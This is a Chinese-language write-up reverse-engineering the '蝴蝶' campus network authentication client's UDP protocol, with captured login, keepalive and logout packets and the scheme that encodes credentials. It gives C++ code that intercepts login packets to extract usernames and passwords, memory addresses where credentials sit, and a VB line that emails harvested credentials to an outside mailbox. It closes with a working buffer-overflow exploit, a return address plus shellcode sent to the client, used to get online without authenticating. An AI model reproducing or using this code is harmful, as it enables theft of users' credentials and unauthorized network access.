##  蝴蝶数据包格式与拦截



1. 蝴蝶数据交互流程



  蝴蝶客户端与服务端通信采用UDP 通信,通信端口是3848 ,服务端IP 为172.16.1.180.交互流程(典型的C/S 模型):请求->应答

 

![图片](pic_temp1\psb1.png)



2. 登陆数据包



上线请求数据包:



```txt
80:c4:4b:44:a1:9d:89:53:24:41:aa:c7:7b:e7:23:6b:95:a3:91:20:56:f8:7d:7b:84:d2:80:30:c8:c9:58:48:49:49:58:c8:d8:58:01:20:48:49:48:d9:c8:58:a0:b1:c8:d9:49:39:c8:59:39:c8:c9:58:39:d8:59:21:21:ac:3d:5c:9c:4d:3d:9c:5c:31:81:80:f1:91:c9:39:d9:39:58

..KD...S$A..{.#k... V.}{...0..XHIIX..X. HIH..X....I9.Y9..X9.Y!!.=\.M=.\1.....9.9X
```



上线应答数据包:



```txt
01:2f:3f:b4:8c:47:c7:bc:5c:32:0b:a6:ac:00:0c:b4:36:73:81:81:80:20:40:c9:e8:49:c8:48:48:d9:d9:58:c8:d8:68:e8:48:68:c8:90:81:78:11:81:10:a1:ac:37:16:87:df:a6:b7:b6:6e:8b:3a:5b:96:7b:6e:1e:bb:06:06:4b:eb:86:7a:46:96:b7:0b:8b:3a:fa:ef:57:ea:db:0b:4b:7a:4b:eb:27:da:c6:56:07:e7:8b:3a:6b:b7:06:be:06:ef:c7:87:b6:6e:07:9f:d7:27:56:5a:28:16:6f:fb:a6:c7:87:86:df:86:fb:37:2b:c9:48:58:48:39:59:59:49:08:b4:a8:28:16:6f:da:16:c7:0e:5b:3f:37:2b:48:39:48:48:08:56:2b:a8:98:61:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:58:11:00:00:00:00:d8:11:00:00:00:00:59:11:1b:03:b9:00:d9:11:00:00:00:00:68:11:76:b5:81:00:c1:50:2c:5c:5c:4c:69:b9:b9:c8:d9:49:39:c8:59:39:c9:39:49:d9:89:81:80:08:81:00

./?..G..\2......6s... @..I.HH..X..h.Hh...x.....7......n.:[.{n....K..zF....:..W...KzK.'..V...:k........n...'VZ(.o........7+.HXH9YYI...(.o....[?7+H9HH.V+..a........................X...........Y..........h.v....P,\\Li....I9.Y9.9I.......
```



细看也许没有什么有用的发现,但是多次测试发现大致格式如下:



```txt
起始标志:0x80 | 25 位数据填充标志 | 帐号起始标志:0x80 | 1 位随机填充标志 | 帐号:_____ | 密码起始标志:0x01 | 1 位随机填充标志 | 密码:_____ | 密码结束标志:0xA0 | 8 位数据填充标志 | 11 位未知数据 | 16 位数据填充标志
```



  而且还有一个最关键的地方,帐号和密码都被稍微"加密"了一下,由于蝴蝶登陆数据包有两套密码对应方案[这是根据数据包起始标志确定的,有0x80,0x81 ],在此只公开一套[0x80 ]:



```c
static const number_table[10]={0x48,0xC8,0x49,0xC9,0x58,0xD8,0x59,0xD9,0x68,0xE8};
```



3. 定时认证数据包



定时认证请求数据包:



```txt
10:48:92:71:ed:bd:9e:95:62:e9:ec:a9:aa:55:f3:e2:7b:6f:81:81:80:20:c1:e8:c8:68:68:48:d8:59:58:48:c8:48:58:c9:c9:d9:48:d9:d9:68:50:11:80:00:80:f0

..X`o,..z.Z....... ...hhH.YXH.HX...H..h.A..I9.Y9..X9Y.... V.}{..P.....)...........8...........9...........
```



定时认证应答数据包:[最大长度是--1500]



```txt
10:48:92:71:ed:bd:9e:95:62:e9:ec:a9:aa:55:f3:e2:7b:6f:81:81:80:20:c1:e8:c8:68:68:48:d8:59:58:48:c8:48:58:c9:c9:d9:48:d9:d9:68:50:11:80:00:80:f0

.H.q....b....U..{o... ...hhH.YXH.HX...H..hP.....
```



大致格式如下:



```txt
起始标志:0x81 | 1 位随登陆认证改变的数据位 | 16 位随机数据 | 0x20 0x41 | 16 认证KEY | 31 位固定数据 | 1 位随机数据 | 36 位固定数据 (不固定104-108 位长度[其实是根据认证改变的])
```



如果蝴蝶没有及时发送认证数据包,将会发生IDLE 认证超时

 

![图片](pic_temp2\psb2.jpg)



4. 下线数据包



下线请求数据包:



```txt
90:ad:8b:de:c4:53:49:ca:d2:4c:06:69:f0:81:32:cd:27:be:20:d0:e8:c8:68:68:48:d8:59:58:48:c8:48:58:c9:c9:d9:48:d9:d9:68:a0:41:c8:d9:49:39:c8:59:39:c8:c9:58:39:d8:59:00:00:00:91:20:56:f8:7d:7b:84:d2:50:11:80:00:80:08:29:11:00:00:00:00:a9:11:00:00:00:00:38:11:00:00:00:00:b8:11:00:00:00:00:39:11:00:00:00:00:b9:11:00:00:00:00

.....SI..L.i..2'. ...hhH.YXH.HX...H..h.A..I9.Y9..X9.Y.... V.}{..P.....)...........8.........9...........
```



下线应答数据包:



```txt
11:29:71:be:77:95:d2:c7:7d:a2:13:ca:4c:cf:b6:13:dc:3b:81:81:80:20:c1:e8:c8:68:68:48:d8:59:58:48:c8:48:58:c9:c9:d9:48:d9:d9:68

.)q.w...}...L....;... ...hhH.YXH.HX...H..h
```





  这个没有用到,所以只能告诉你起始标志为0x11



5. 拦截



Packet Resolve Code for C++ :



```c++
class login_packet {
 public:
  explicit login_packet(const string& resolve_packet) {
    string resolve_string(resolve_packet);

    if (!resolve_string.empty()) {
        if (!resolve_string.find(FLAG_START) || !resolve_string.find(FLAG_ACCOUNT_START) ||
            !resolve_string.find(FLAG_PASSWORD_START) || !resolve_string.find(FLAG_PASSWORD_END)) {

           resolve_string=resolve_string.substr(DATA_OFFSET_FLAG_ACCOUNT_START+DATA_OFFSET_ACCOUNT_START,resolve_string.size());
           string resolve_account (resolve_string.substr(0,resolve_string.find_first_of(FLAG_PASSWORD_START)));
           resolve_string=resolve_string.substr(resolve_string.find_first_of(FLAG_PASSWORD_START)+DATA_OFFSET_PASSWORD_START,resolve_string.size());
           string resolve_password(resolve_string.substr(0,resolve_string.find_first_of(FLAG_PASSWORD_END)));

           if (!resolve_account.empty() && !resolve_password.empty()) {
               decode_number(resolve_account,username);
               decode_number(resolve_password,password);
           }
        }
    }
  };
  ~login_packet() {
  };

  string get_username(void) const {
    return username;
  };
  string get_password(void) const {
    return password;
  };

 private:
  static void number_to_string(long in_number,char* output_string)  //  省略部分代码
  static long string_to_number(const char* input_string)  //  省略部分代码

  static int resolve_number(unsigned char in_number)  //  省略部分代码
  static bool decode_number (const string& in_number,string& out_string)  // 省略部分代码 

  string username;
  string password;
};
```



效果如下:
 

![图片](pic_temp2\psb3.jpg)



##  帐号与密码的获取与发送



1. 帐号与密码



  内存地址.帐号地址:0x0045B7E8  ,密码地址:0x0045B808



2. EMail 发送



Send EMali Code for VB:



```visual basic
SendEmail("smtp.sina.cn", "supplicant_monitor", "supplicant_monitor_login", "lcatro@sina.cn","Account:" & login_packet_get.get_username() & vbcrlf & "Password:" & login_packet_get.get_password())
```



##  蝴蝶客户端远程缓冲区溢出攻击原理



1. 攻击原理



  主要思路是利用定时认证来突破.由于蝴蝶经常会向服务端发送定时认证数据包,所以在recvfrom 的时候可以利用超长数据包溢出栈来运行ShellCode.



2. 实现



  The Main Code for C:



```c++
char ret_address[4]={0xBC,0x91,0x41,0x00};
char shellcode[]={0xB8,0xE8,0xB7,0x45,0x00,0xBB,0x08,0xB8,0x45,0x00,0x6A,0x00,0x50,0x53,0x6A,0x00,0xB8,0x1E,0xFD,0x1B,0x77,0xFF,0xD0};
char buffer[ALLOC_BUFFER_LENGTH]={0};

memset(buffer,' ',TARGE_BUFFER_LENGTH);
memcpy(buffer+TARGE_BUFFER_LENGTH,ret_address,sizeof(ret_address));

memcpy(buffer+TARGE_BUFFER_LENGTH+sizeof(long),shellcode,sizeof(shellcode));

sendto(sock,buffer,sizeof(buffer),0,(const sockaddr*)&targe,sizeof(targe));
Sleep(1);
```


  效果:

![img](pic_temp2\psb4.jpg) 



未认证上网时浏览网页



图解:



![图片](pic_temp2\psb5.jpg)



![图片](pic_temp2\psb6.webp.jpg)

